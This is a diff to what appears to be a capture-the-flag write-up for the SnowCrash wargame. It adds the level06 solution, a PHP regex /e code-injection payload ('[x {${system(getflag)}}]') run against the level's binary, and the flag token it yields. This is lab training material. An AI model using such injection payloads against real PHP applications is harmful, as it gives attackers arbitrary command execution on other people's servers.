@@ -120,3 +120,21 @@ Check flag.Here is your token : viuaaale9huek52boumoomioc
 ## flag : viuaaale9huek52boumoomioc
 
 # Flag 06
+
+./level06 test s
+PHP Notice:  Undefined variable: system in /home/user/level06/level06.php(4) : regexp code on line 1
+(getflag)
+level06@SnowCrash:~$ cat test
+[x $system(getflag)]
+
+[x {${system(getflag)}}]
+
+./level06 test s
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+
+## flag : wiok45aaoguiboiki2tuin6ub
+
+# Flag 07
+
